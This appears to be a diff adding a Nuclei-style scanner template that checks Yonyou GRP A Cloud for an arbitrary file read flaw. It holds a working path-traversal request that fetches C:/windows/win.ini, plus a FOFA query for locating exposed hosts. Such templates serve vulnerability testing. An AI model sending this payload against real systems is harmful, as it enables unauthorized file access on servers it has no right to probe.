@@ -1,0 +1,25 @@
+id: yonyou-grp-a-cloud-FileDownload-lfi-1
+
+info:
+  name: 用友 GRP A Cloud 政府财务云系统 FileDownload - fileread
+  author: leadlife
+  severity: high
+  description:
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-qeury: app="用友-政务财务系统" || body="/pf/portal/login/css/fonts/style.css"
+  tags: yonyou,lfi,oa,grpacloud
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/pub/fe/config/..;/..;/..;/bg/attach/FileDownload?execlPath=C:/windows/win.ini"
+      - "{{BaseURL}}/pub/fe/config/..;/..;/..;/bg/attach/FileDownload?execlPath=this_is_waf"
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(all_headers,"attachment;filename=")
